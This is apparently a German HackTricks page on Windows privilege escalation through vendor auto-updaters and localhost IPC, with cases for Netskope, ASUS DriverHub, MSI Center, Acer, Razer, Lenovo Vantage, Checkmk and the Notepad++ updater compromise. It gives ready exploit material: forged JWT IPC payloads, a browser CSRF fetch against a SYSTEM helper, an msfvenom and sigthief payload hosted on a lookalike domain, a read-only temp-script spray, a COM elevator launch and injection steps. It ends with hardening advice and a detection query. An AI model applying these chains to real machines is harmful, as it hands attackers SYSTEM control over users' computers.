# Missbrauch von Enterprise Auto-Updatern und privilegiertem IPC (z. B. Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Diese Seite verallgemeinert eine Klasse von Windows-Ketten zur lokalen Privilege Escalation, die in Enterprise-Endpoint-Agents und Updatern gefunden wurden, welche eine leicht zugängliche IPC-Oberfläche und einen privilegierten Update-Ablauf bereitstellen. Ein repräsentatives Beispiel ist Netskope Client for Windows < R129 (CVE-2025-0309), bei dem ein Benutzer mit niedrigen Rechten die Registrierung bei einem vom Angreifer kontrollierten Server erzwingen und anschließend eine schädliche MSI-Datei bereitstellen kann, die der SYSTEM-Dienst installiert.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Wichtige Ideen, die sich auf ähnliche Produkte übertragen lassen:
- Die localhost-IPC eines privilegierten Dienstes missbrauchen, um eine erneute Registrierung oder Neukonfiguration auf einem vom Angreifer kontrollierten Server zu erzwingen.
- Die Update-Endpunkte des Herstellers implementieren, eine rogue Trusted Root CA bereitstellen und den Updater auf ein bösartiges, „signiertes“ Package verweisen lassen.
- Schwache Signer-Checks (CN-Allow-Lists), optionale Digest-Flags und nachlässige MSI-Properties umgehen.
- Wenn die IPC „verschlüsselt“ ist, den Schlüssel/IV aus weltweit lesbaren Maschinenkennungen ableiten, die in der Registry gespeichert sind.
- Wenn der Dienst Aufrufer anhand des Image-Pfads oder Prozessnamens beschränkt, in einen allow-gelisteten Prozess injizieren oder einen Prozess suspended starten und die DLL über einen minimalen Thread-Context-Patch bootstrapen.

---
## 1) Registrierung bei einem Angreifer-Server über localhost-IPC erzwingen

Viele Agents enthalten einen User-Mode-UI-Prozess, der über localhost TCP unter Verwendung von JSON mit einem SYSTEM-Dienst kommuniziert.

In Netskope beobachtet:
- UI: stAgentUI (low integrity) ↔ Dienst: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit-Ablauf:
1) Einen JWT-Registrierungstoken erstellen, dessen Claims den Backend-Host steuern (z. B. AddonUrl). `alg=None` verwenden, damit keine Signatur erforderlich ist.
2) Die IPC-Nachricht senden, die den Provisioning-Command mit deinem JWT und dem Tenant-Namen aufruft:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Der Service beginnt, deinen rogue Server für Enrollment/Config anzusprechen, z. B.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Hinweise:
- Wenn die Caller-Verifizierung auf Pfad/Name basiert, sende die Anfrage von einer allow-listed Vendor-Binary aus (siehe §4).<sup>[[1]](#references)[[2]](#references)</sup>

---
## 2) Den Update-Kanal hijacken, um Code als SYSTEM auszuführen

Sobald der Client mit deinem Server kommuniziert, implementiere die erwarteten Endpoints und leite ihn zu einer angreifer-gesteuerten MSI weiter. Typischer Ablauf:

1) /v2/config/org/clientconfig → Gib eine JSON-Konfiguration mit einem sehr kurzen Updater-Intervall zurück, z. B.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Liefert ein PEM-CA-Zertifikat zurück. Der Dienst installiert es im Local Machine Trusted Root-Speicher.
3) /v2/checkupdate → Liefert Metadaten, die auf ein bösartiges MSI und eine gefälschte Version verweisen.

Umgehung gängiger Prüfungen aus der Praxis:
- Signer-CN-Allow-list: Der Dienst prüft möglicherweise nur, ob der Subject CN „netSkope Inc“ oder „Netskope, Inc.“ entspricht. Ihre Rogue CA kann ein Leaf-Zertifikat mit diesem CN ausstellen und das MSI signieren.
- CERT_DIGEST-Eigenschaft: Fügen Sie eine harmlose MSI-Eigenschaft namens CERT_DIGEST hinzu. Bei der Installation erfolgt keine Durchsetzung.
- Optionale Digest-Durchsetzung: Ein Config-Flag (z. B. check_msi_digest=false) deaktiviert zusätzliche kryptografische Validierung.

Ergebnis: Der SYSTEM-Dienst installiert Ihr MSI aus
C:\ProgramData\Netskope\stAgent\data\*.msi
und führt beliebigen Code als NT AUTHORITY\SYSTEM aus.<sup>[[1]](#references)[[2]](#references)</sup>

Lektion zur Patch-Umgehung: Wenn ein Anbieter darauf reagiert, indem er eine kleine Gruppe „vertrauenswürdiger“ Domains allow-listet, anstatt die Update-Quelle kryptografisch zu authentifizieren, suchen Sie nach vom Anbieter betriebenen Redirectors oder Reverse Proxies, über die sich der Datenverkehr weiterhin steuern lässt. Im Fall von Netskope zeigte eine öffentliche Folgestudie, dass eine Allow-list aus der R129-Ära weiterhin über `rproxy.goskope.com` missbraucht werden konnte, das von Angreifern kontrollierte Azure App Service-Inhalte weiterleitete. Behandeln Sie Hostname-Allow-lists als Geschwindigkeitsbegrenzung, nicht als Trust Boundary.<sup>[[14]](#references)</sup>

---
## 3) Verschlüsselte IPC requests fälschen (falls vorhanden)

Ab R127 kapselte Netskope IPC-JSON in einem encryptData-Feld, das wie Base64 aussieht. Reversing zeigte AES mit Key/IV, die aus für jeden Benutzer lesbaren Registry-Werten abgeleitet werden:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Angreifer können die Verschlüsselung reproduzieren und gültige verschlüsselte Befehle von einem Standardbenutzer senden.<sup>[[1]](#references)[[2]](#references)</sup> Allgemeiner Tipp: Wenn ein Agent seine IPC plötzlich „verschlüsselt“, suchen Sie nach Device IDs, Product GUIDs und Install IDs unter HKLM, die als Material verwendet werden.

---
## 4) IPC-Caller-Allow-lists umgehen (Pfad-/Namensprüfungen)

Einige Dienste versuchen, den Peer zu authentifizieren, indem sie die PID der TCP-Verbindung auflösen und den Image-Pfad bzw. -Namen mit allow-gelisteten Vendor-Binaries vergleichen, die sich unter Program Files befinden (z. B. stagentui.exe, bwansvc.exe, epdlp.exe).

Zwei praktische Umgehungen:
- DLL injection in einen allow-gelisteten Prozess (z. B. nsdiag.exe) und IPC proxy aus diesem Prozess heraus.
- Ein allow-gelistetes Binary suspended starten und Ihre Proxy-DLL ohne CreateRemoteThread bootstrappen (siehe §5), um vom Treiber erzwungene Tamper-Regeln zu erfüllen.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Tamper-Protection-freundliche Injection: suspended process + NtContinue patch

Produkte liefern häufig einen Minifilter-/OB-callbacks-Treiber (z. B. Stadrv) aus, der gefährliche Rechte aus Handles zu geschützten Prozessen entfernt:
- Process: entfernt PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: beschränkt auf THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Ein zuverlässiger User-Mode-Loader, der diese Einschränkungen berücksichtigt:
1) CreateProcess eines Vendor-Binaries mit CREATE_SUSPENDED.
2) Beschaffen Sie weiterhin erlaubte Handles: PROCESS_VM_WRITE | PROCESS_VM_OPERATION für den Prozess sowie einen Thread-Handle mit THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (oder nur THREAD_RESUME, wenn Sie Code an einem bekannten RIP patchen).
3) Überschreiben Sie ntdll!NtContinue (oder einen anderen frühzeitig und garantiert gemappten Thunk) mit einem kleinen Stub, der LoadLibraryW für Ihren DLL-Pfad aufruft und anschließend zurückspringt.
4) ResumeThread, um Ihren Stub im Prozess auszulösen und Ihre DLL zu laden.

Da Sie bei einem bereits geschützten Prozess niemals PROCESS_CREATE_THREAD oder PROCESS_SUSPEND_RESUME verwendet haben (Sie haben ihn erstellt), wird die Policy des Treibers erfüllt.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Praktische Tooling
- NachoVPN (Netskope plugin) automatisiert eine Rogue CA, das Signieren eines bösartigen MSI und stellt die benötigten Endpoints bereit: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope ist ein benutzerdefinierter IPC client, der beliebige (optional AES-verschlüsselte) IPC messages erstellt und die suspended-process injection enthält, um von einem allow-gelisteten Binary aus zu agieren.<sup>[[4]](#references)</sup>

## 7) Schneller Triage-Workflow für unbekannte Updater-/IPC-Oberflächen

Wenn Sie auf einen neuen Endpoint-Agent oder eine „Helper“-Suite für Mainboards stoßen, reicht ein kurzer Workflow normalerweise aus, um festzustellen, ob es sich um ein vielversprechendes Privesc-Ziel handelt:<sup>[[6]](#references)</sup>

1) Loopback-Listener enumerieren und auf Vendor-Prozesse zurückführen:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Kandidaten für Named Pipes enumerieren:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Registry-gestützte Routing-Daten auslesen, die von Plugin-basierten IPC-Servern verwendet werden:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Extrahiere zunächst die Namen der Endpunkte, JSON-Schlüssel und Befehls-IDs aus dem User-Mode-Client. Gepackte Electron/.NET-Frontends leaken häufig das vollständige Schema:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) Suche nach der tatsächlichen Vertrauensbedingung, nicht nur nach dem Codepfad, der letztendlich den Prozess startet:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Muster, die priorisiert werden sollten:
- `CryptQueryObject`/Zertifikatsparsing ohne `WinVerifyTrust` bedeutet normalerweise, dass „Zertifikat vorhanden“ als „Zertifikat vertrauenswürdig“ behandelt wurde, wodurch Zertifikatsklonen oder andere Fake-Signer-Tricks möglich werden.
- Substring-/Suffix-Prüfungen über `Origin`, `Referer`, Download-URLs, Prozessnamen oder Signer-CNs sind keine Authentifizierung. `contains(".vendor.com")` ist normalerweise mit vom Angreifer kontrollierten Lookalike-Domains ausnutzbar.
- Wenn die GUI mit niedrigen Rechten entscheidet, dass „die Datei vertrauenswürdig ist“, und der SYSTEM-Broker dieses Ergebnis lediglich übernimmt, umgeht das Patchen oder Reimplementieren der clientseitigen DLL/JS die Grenze oft vollständig (Razer-style split validation).
- Wenn der Broker ein Payload nach `%TEMP%`/`C:\Windows\Temp` kopiert und es anschließend von diesem Pfad aus validiert oder einplant, sollten umgehend TOCTOU-Replacement-Windows sowie benachbarte Plugin-Module getestet werden, die alternative `ExecuteTask()`-Wrapper mit schwächeren Prüfungen bereitstellen.<sup>[[6]](#references)</sup>

Bei Targets mit vielen named pipes ist PipeViewer eine schnelle Möglichkeit, schwache DACLs und remote erreichbare Pipes zu erkennen, bevor du mit dem detaillierten Reversing des Protokolls beginnst.<sup>[[11]](#references)</sup>

Wenn das Target Caller ausschließlich anhand von PID, Image Path oder Prozessnamen authentifiziert, sollte dies eher als Geschwindigkeitsbarriere denn als Grenze betrachtet werden: Das Injizieren in den legitimen Client oder das Herstellen der Verbindung aus einem allow-gelisteten Prozess reicht oft aus, um die Prüfungen des Servers zu erfüllen. Für named pipes behandelt [diese Seite über Client-Impersonation und Pipe-Abuse](named-pipe-client-impersonation.md) das Primitive ausführlicher.

---
## 8) Modulare Add-in-Broker, die ausschließlich anhand von Vendor-Signaturen authentifiziert werden (Lenovo-Vantage-Muster)

Eine neuere, lohnende Variante ist der **signed-client RPC broker**: Ein Lenovo-signierter Desktop-Prozess mit niedrigen Rechten kommuniziert mit einem SYSTEM-Service, und der Service leitet JSON-Befehle an eine Reihe von XML-beschriebenen Add-ins unter `%ProgramData%` weiter. Sobald Code Execution **innerhalb eines beliebigen akzeptierten signierten Clients** erreicht wurde, wird jeder Vertrag mit `runas="system"` Teil deiner Angriffsfläche.<sup>[[15]](#references)</sup>

Wichtige Primitives, die bei der Lenovo-Vantage-Forschung beobachtet wurden:
- **Dem Caller vertrauen, weil er vom Vendor signiert ist**: Forschende erreichten einen authentifizierten Kontext, indem sie eine Lenovo-signierte EXE in ein beschreibbares Verzeichnis kopierten und einen DLL-Side-Load (`profapi.dll`) erfüllten, sodass beliebiger Code innerhalb eines Clients ausgeführt wurde, dem der Service bereits vertraute.
- **Manifestgesteuerte Erkennung der Angriffsfläche**: Add-ins werden unter `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` deklariert. Mehrere Verträge laufen als `SYSTEM`, weshalb das Auflisten dieser Manifeste oft schneller die tatsächlichen privilegierten Verben offenlegt als das Reversing des Brokers selbst.
- **Fehler pro Befehl hinter dem authentifizierten Kanal**: Nachdem Forschende in den vertrauenswürdigen Client gelangt waren, fanden sie in öffentlichen Untersuchungen Path-Traversal- und Race-Condition-Probleme in Update-/Install-Verben, Raw-SQL-Missbrauch in privilegierten Settings-Datenbanken sowie substringbasierte Registry-Pfadprüfungen, die Schreibvorgänge außerhalb der vorgesehenen Hive ermöglichten.

Nützliche Recon auf einem Target:
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
Praktische Schlussfolgerung: Sobald eine Helper-Suite einen Broker bereitstellt, der zunächst den **aufrufenden Prozess** authentifiziert und erst danach Dutzende Plugin-/Add-in-Befehle weiterleitet, sollte man sich nicht damit begnügen, den vorgeschalteten Trust-Check zu umgehen. Exportiert die Manifest-/Contract-Tabelle und fuzz jeden Verb mit hohen Privilegien unabhängig; der authentifizierte Kanal verbirgt üblicherweise mehrere Bugs in der zweiten Stufe.

---
## 1) Browser-to-localhost CSRF gegen privilegierte HTTP-APIs (ASUS DriverHub)

DriverHub liefert einen User-Mode-HTTP-Service (ADU.exe) auf 127.0.0.1:53000 aus, der Browser-Aufrufe erwartet, die von https://driverhub.asus.com stammen. Der Origin-Filter führt über den Origin-Header und über Download-URLs, die von `/asus/v1.0/*` bereitgestellt werden, lediglich `string_contains(".asus.com")` aus. Jede von einem Angreifer kontrollierte Host-Adresse wie `https://driverhub.asus.com.attacker.tld` besteht daher die Prüfung und kann statusverändernde Requests aus JavaScript senden.<sup>[[6]](#references)</sup> Siehe [CSRF-Grundlagen](../../pentesting-web/csrf-cross-site-request-forgery.md) für weitere Bypass-Muster.

Praktischer Ablauf:
1) Registriere eine Domain, die `.asus.com` enthält, und hoste dort eine bösartige Webseite.
2) Verwende `fetch` oder XHR, um einen privilegierten Endpoint (z. B. `Reboot`, `UpdateApp`) unter `http://127.0.0.1:53000` aufzurufen.
3) Sende den vom Handler erwarteten JSON-Body – das gepackte Frontend-JS zeigt das folgende Schema.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Selbst die unten gezeigte PowerShell-CLI funktioniert, wenn der Origin-Header auf den vertrauenswürdigen Wert gefälscht wird:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Jeder Browser-Besuch auf der Angreifer-Website wird dadurch zu einem lokalen CSRF mit 1 Klick (oder 0 Klicks über `onload`), der einen SYSTEM-Helfer steuert.

---
## 2) Unsichere Code-Signing-Verifizierung und Zertifikatklonen (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` lädt beliebige, im JSON-Body definierte Executables herunter und cached sie in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Die Validierung der Download-URL verwendet dieselbe Substring-Logik, sodass `http://updates.asus.com.attacker.tld:8000/payload.exe` akzeptiert wird. Nach dem Download prüft ADU.exe vor der Ausführung lediglich, ob das PE eine Signatur enthält und ob der Subject-String mit ASUS übereinstimmt – kein `WinVerifyTrust`, keine Chain-Validierung.

Um den Ablauf zu weaponizen:
1) Ein Payload erstellen (z. B. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Den Signer von ASUS in den Payload klonen (z. B. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) `pwn.exe` auf einer `.asus.com`-Lookalike-Domain hosten und UpdateApp über den obigen Browser-CSRF auslösen.

Da sowohl die Origin- als auch die URL-Filter auf Substrings basieren und die Signer-Prüfung lediglich Strings vergleicht, lädt DriverHub das Binary des Angreifers herunter und führt es in seinem erhöhten Kontext aus.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU innerhalb der Copy/Execute-Pfade des Updaters (MSI Center CMD_AutoUpdateSDK)

Der SYSTEM-Service von MSI Center stellt ein TCP-Protokoll bereit, bei dem jeder Frame aus `4-byte ComponentID || 8-byte CommandID || ASCII arguments` besteht. Die Core-Komponente (Component ID `0f 27 00 00`) liefert `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Ihr Handler:
1) Kopiert das angegebene Executable nach `C:\Windows\Temp\MSI Center SDK.exe`.
2) Prüft die Signatur über `CS_CommonAPI.EX_CA::Verify` (der Certificate Subject muss „MICRO-STAR INTERNATIONAL CO., LTD.“ entsprechen und `WinVerifyTrust` muss erfolgreich sein).
3) Erstellt eine Scheduled Task, die die Temp-Datei mit vom Angreifer kontrollierten Argumenten als SYSTEM ausführt.

Die kopierte Datei wird zwischen der Verifizierung und `ExecuteTask()` nicht gesperrt. Ein Angreifer kann:
- Frame A senden, der auf ein legitimes, von MSI signiertes Binary verweist (dadurch wird garantiert, dass die Signaturprüfung erfolgreich ist und die Task in die Warteschlange gestellt wird).
- Dies mit wiederholten Frame-B-Nachrichten in einem Race ausnutzen, die auf einen bösartigen Payload verweisen und `MSI Center SDK.exe` unmittelbar nach Abschluss der Verifizierung überschreiben.

Wenn der Scheduler auslöst, führt er den überschriebenen Payload als SYSTEM aus, obwohl ursprünglich die Originaldatei validiert wurde. Für eine zuverlässige Ausnutzung werden zwei Goroutines/Threads verwendet, die `CMD_AutoUpdateSDK` so lange senden, bis das TOCTOU-Fenster gewonnen ist.<sup>[[6]](#references)</sup>

---
## 2) Ausnutzen benutzerdefinierter SYSTEM-Level-IPC und Impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Jedes von `MSI.CentralServer.exe` geladene Plugin/DLL erhält eine Component ID, die unter `HKLM\SOFTWARE\MSI\MSI_CentralServer` gespeichert wird. Die ersten 4 Bytes eines Frames wählen diese Komponente aus, wodurch Angreifer Befehle an beliebige Module routen können.
- Plugins können eigene Task Runner definieren. `Support\API_Support.dll` stellt `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` bereit und ruft `API_Support.EX_Task::ExecuteTask()` ohne Signaturvalidierung direkt auf – jeder lokale Benutzer kann darauf `C:\Users\<user>\Desktop\payload.exe` verweisen und deterministisch eine SYSTEM-Ausführung erreichen.
- Das Sniffen des Loopback-Traffics mit Wireshark oder das Instrumentieren der .NET-Binaries in dnSpy macht das Component-↔-Command-Mapping schnell sichtbar; benutzerdefinierte Go-/Python-Clients können die Frames anschließend wiedergeben.<sup>[[6]](#references)</sup>

### Acer Control Centre Named Pipes und Impersonation-Level
- `ACCSvc.exe` (SYSTEM) stellt `\\.\pipe\treadstone_service_LightMode` bereit, und die Discretionary ACL erlaubt Remote-Clients (z. B. `\\TARGET\pipe\treadstone_service_LightMode`). Das Senden der Command ID `7` zusammen mit einem Dateipfad ruft die Process-Spawning-Routine des Services auf.
- Die Client-Library serialisiert gemeinsam mit den Argumenten ein Magic-Terminator-Byte (113). Dynamische Instrumentierung mit Frida/`TsDotNetLib` (siehe [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) für Instrumentierungstipps) zeigt, dass der native Handler diesen Wert vor dem Aufruf von `CreateProcessAsUser` auf ein `SECURITY_IMPERSONATION_LEVEL` und eine Integrity-SID abbildet.
- Das Ersetzen von 113 (`0x71`) durch 114 (`0x72`) führt in den generischen Zweig, der das vollständige SYSTEM-Token beibehält und eine High-Integrity-SID (`S-1-16-12288`) setzt. Das gestartete Binary läuft daher als uneingeschränktes SYSTEM, sowohl lokal als auch maschinenübergreifend.
- Zusammen mit dem offengelegten Installer-Flag (`Setup.exe -nocheck`) kann ACC auch auf Lab-VMs eingerichtet und die Pipe ohne Vendor-Hardware getestet werden.<sup>[[6]](#references)</sup>

Diese IPC-Bugs verdeutlichen, warum Localhost-Services eine gegenseitige Authentifizierung erzwingen müssen (ALPC-SIDs, `ImpersonationLevel=Impersonation`-Filter, Token-Filtering) und warum jeder „run arbitrary binary“-Helper eines Moduls dieselben Signer-Verifizierungen verwenden muss.

---
## 3) COM/IPC-„Elevator“-Helper mit schwacher Validierung im User-Mode (Razer Synapse 4)

Razer Synapse 4 fügte dieser Familie ein weiteres nützliches Muster hinzu: Ein Benutzer mit niedrigen Rechten kann einen COM-Helper auffordern, über `RzUtility.Elevator` einen Prozess zu starten, während die Trust-Entscheidung an eine User-Mode-DLL (`simple_service.dll`) delegiert wird, anstatt robust innerhalb der privilegierten Grenze durchgesetzt zu werden.

Beobachteter Exploitation-Pfad:
- Das COM-Objekt `RzUtility.Elevator` instanziieren.
- `LaunchProcessNoWait(<path>, "", 1)` aufrufen, um einen erhöhten Start anzufordern.
- Im öffentlichen PoC wird der PE-Signature-Gate innerhalb von `simple_service.dll` vor dem Senden der Anfrage gepatcht, wodurch ein beliebiges, vom Angreifer gewähltes Executable gestartet werden kann.<sup>[[6]](#references)</sup>

Minimale PowerShell-Aufrufsyntax:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Allgemeine Erkenntnis: Beim Reverse Engineering von „Helper“-Suiten sollte man nicht bei localhost TCP oder named pipes aufhören. Prüfe auf COM-Klassen mit Namen wie `Elevator`, `Launcher`, `Updater` oder `Utility`, und verifiziere anschließend, ob der privilegierte Dienst die Ziel-Binary selbst validiert oder lediglich einem Ergebnis vertraut, das von einer patchbaren user-mode client DLL berechnet wurde. Dieses Muster ist nicht auf Razer beschränkt: Jedes geteilte Design, bei dem der Broker mit hohen Privilegien eine Allow-/Deny-Entscheidung von der Seite mit niedrigen Privilegien übernimmt, ist ein möglicher privesc-Angriffsvektor.


---
## Vorhersehbare Ausführung temporärer Scripts während der MSI-Reparatur (Checkmk Agent / CVE-2024-0670)

Einige Windows-Agenten führen privilegierte Aktionen weiterhin aus, indem sie eine temporäre `.cmd`-Datei in `C:\Windows\Temp` schreiben und sie als `SYSTEM` ausführen. Wenn der Dateiname vorhersehbar ist und der Dienst vorhandene Dateien nicht sicher neu erstellt, kann ein Benutzer mit niedrigen Privilegien die zukünftige temporäre Datei vorab als **schreibgeschützt** anlegen und den privilegierten Prozess dazu bringen, vom Angreifer kontrollierten Inhalt statt seines eigenen Scripts auszuführen.

Bei verwundbaren Checkmk-Agent-Builds beobachtet:
- temp pattern: `cmk_all_<PID>_1.cmd`
- affected branches: `2.0.0`, `2.1.0`, `2.2.0`
- trigger: MSI-**Reparatur** des gecachten Agent-Pakets<sup>[[8]](#references)[[9]](#references)</sup>

Praktischer Ablauf:
1. Schätze einen realistischen PID-Bereich anhand der aktuellen Prozess-IDs oder der PID des laufenden Agenten.
2. Schreibe ein kurzes **ASCII**-`.cmd`-Payload (`Set-Content -Encoding Ascii` oder `cmd.exe`-Umleitung; vermeide UTF-16-PowerShell-Ausgabe für Batch-Dateien).
3. Führe ein Spray von `C:\Windows\Temp\cmk_all_<PID>_1.cmd` über den möglichen Bereich durch und markiere jede Datei als schreibgeschützt.
4. Löse eine Reparatur der gecachten MSI aus, damit der privilegierte Dienst versucht, das temporäre Script neu zu erstellen und anschließend auszuführen.<sup>[[7]](#references)</sup>
```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```
Wenn das verwundbare Produkt mit Windows Installer installiert wurde, ordne die zufällig aussehende zwischengespeicherte MSI-Datei unter `C:\Windows\Installer` vor dem Auslösen der Reparatur ihrem Produktnamen zu:<sup>[[7]](#references)</sup>
```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
ForEach-Object {
$p = Get-ItemProperty $_.PSPath
[PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
} | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```
Betriebsnotizen:
- `qwinsta` ist nützlich, wenn `msiexec /fa` aus einer nicht interaktiven WinRM-Shell fehlschlägt und du verstehen musst, ob eine vorhandene Desktop-/getrennte Sitzung die Reparatur korrekt auslösen kann.<sup>[[7]](#references)</sup>
- Dieses Muster lässt sich auf andere Endpoint-Agents und Updater verallgemeinern, die **temporäre Scripts in für alle beschreibbaren Speicherorten ablegen und später als SYSTEM ausführen**. Teste auf vorhersehbare Namen, fehlende Semantik für exklusives Erstellen und Reparatur-/Update-Abläufe, die bei Bedarf ausgelöst werden können.

---
## Remote-Supply-Chain-Hijacking durch schwache Updater-Validierung (WinGUp / Notepad++)

Zwischen Juni 2025 und Dezember 2025 lieferten Angreifer, die die Hosting-Infrastruktur hinter dem Notepad++-Update-Ablauf kompromittiert hatten, ausgewählten Opfern gezielt schädliche Manifeste aus. Ältere auf WinGUp basierende Updater überprüften die Update-Authentizität nicht vollständig, sodass eine manipulierte XML-Antwort Clients auf von Angreifern kontrollierte URLs umleiten konnte. Da der Client HTTPS-Inhalte akzeptierte, ohne sowohl eine vertrauenswürdige Zertifikatskette als auch eine gültige PE-Signatur des heruntergeladenen Installers zu erzwingen, luden Opfer eine trojanisierte NSIS-`update.exe` herunter und führten sie aus.<sup>[[12]](#references)[[13]](#references)</sup>

Betriebsablauf (kein lokaler Exploit erforderlich):
1. **Abfangen der Infrastruktur**: CDN/Hosting kompromittieren und auf Update-Prüfungen mit Angreifer-Metadaten antworten, die auf eine schädliche Download-URL verweisen.
2. **Trojanisiertes NSIS**: Der Installer lädt ein Payload herunter bzw. führt es aus und missbraucht zwei Ausführungsketten:
- **Eigenes signiertes Binary + Sideload**: Das signierte Bitdefender-`BluetoothService.exe` beilegen und eine schädliche `log.dll` in dessen Suchpfad ablegen. Wenn das signierte Binary ausgeführt wird, lädt Windows `log.dll` per Sideload, die die Chrysalis-Backdoor entschlüsselt und reflexiv lädt (durch Warbird geschützt + API hashing zur Erschwerung der statischen Erkennung).
- **Script-gesteuerte Shellcode-Injection**: NSIS führt ein kompiliertes Lua-Script aus, das Win32-APIs (z. B. `EnumWindowStationsW`) verwendet, um Shellcode zu injizieren und Cobalt Strike Beacon bereitzustellen.<sup>[[12]](#references)</sup>

Maßnahmen zur Härtung/Erkennung für jeden Auto-Updater:
- **Zertifikats- und Signaturprüfung** des heruntergeladenen Installers erzwingen (Vendor-Signer pinnen, abweichenden CN bzw. abweichende Zertifikatskette ablehnen) und das Update-Manifest selbst signieren (z. B. XMLDSig). Vom Manifest gesteuerte Redirects blockieren, sofern sie nicht validiert wurden.
- **BYO-signiertes-Binary-Sideloading** als Detection-Pivot nach dem Download behandeln: Alarm auslösen, wenn ein signiertes Vendor-EXE eine DLL mit einem Namen außerhalb seines kanonischen Installationspfads lädt (z. B. wenn Bitdefender `log.dll` aus Temp/Downloads lädt), sowie wenn ein Updater Installer aus temporären Verzeichnissen ablegt/ausführt, die keine Vendor-Signaturen besitzen.
- Die in dieser Kette beobachteten **malwarespezifischen Artefakte** überwachen (als generische Pivots nützlich): Mutex `Global\Jdhfv_1.0.1`, anomale Schreibvorgänge von `gup.exe` nach `%TEMP%` und Lua-gesteuerte Shellcode-Injection-Stages.
- Notepad++ reagierte darauf, indem WinGUp in v8.8.9 und später verstärkt wurde: Das zurückgegebene XML ist nun signiert (XMLDSig), und neuere Builds erzwingen die Zertifikats- und Signaturprüfung des heruntergeladenen Installers, statt allein dem Transport zu vertrauen.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Bitdefender-signiertes EXE-Sideloading von <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
